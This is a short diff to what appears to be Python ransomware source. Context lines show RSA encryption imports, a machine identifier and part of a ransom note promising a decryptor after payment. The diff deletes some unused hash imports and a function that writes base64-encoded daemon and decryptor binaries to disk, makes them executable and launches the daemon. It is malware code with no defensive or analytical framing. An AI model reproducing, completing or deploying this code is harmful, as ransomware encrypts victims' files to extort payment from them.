@@ -17,9 +17,6 @@ import subprocess
 machine_id = environment.get_unique_machine_id()
 
 from Crypto.PublicKey import RSA
-from Crypto.Hash import MD5
-from Crypto.Hash import SHA
-from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 
 
@@ -168,18 +165,6 @@ After confirmed payment, you will receive the decryptor tool.
         except OSError:
             pass
 
-
-def drop_daemon_and_decryptor():
-    with open(variables.decryptor_path,'wb') as f:
-        f.write(base64.b64decode(variables.decryptor))
-
-    with open(variables.daemon_path, 'wb') as f:
-        f.write(base64.b64decode(variables.daemon))
-
-    os.chdir(variables.ransomware_path)
-    os.system('chmod +x daemon')
-    os.system('chmod +x decryptor')
-    utils.run_subprocess('./daemon')
 
 
 if __name__ == "__main__":
